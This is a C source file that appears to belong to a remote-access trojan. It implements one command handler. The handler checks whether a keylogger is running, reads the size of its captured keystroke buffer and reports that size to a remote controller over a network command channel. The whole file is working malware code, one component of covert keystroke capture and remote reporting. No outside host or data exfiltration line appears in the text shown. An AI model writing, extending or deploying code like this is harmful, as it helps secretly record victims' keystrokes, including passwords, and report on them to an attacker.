#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "keylogger.h"

int command_Keylogger_Size(void)
{
	if(!keylogger_IsRunning)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	uint32 size = keylogger_GetSize();
	uint8 s_size[5];
	s_size[0] = (size) & 0xFF;
	s_size[1] = (size >> 8) & 0xFF;
	s_size[2] = (size >> 16) & 0xFF;
	s_size[3] = (size >> 24) & 0xFF;
	s_size[4] = 0;

	if(net_SendCmd(s_size, 5, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}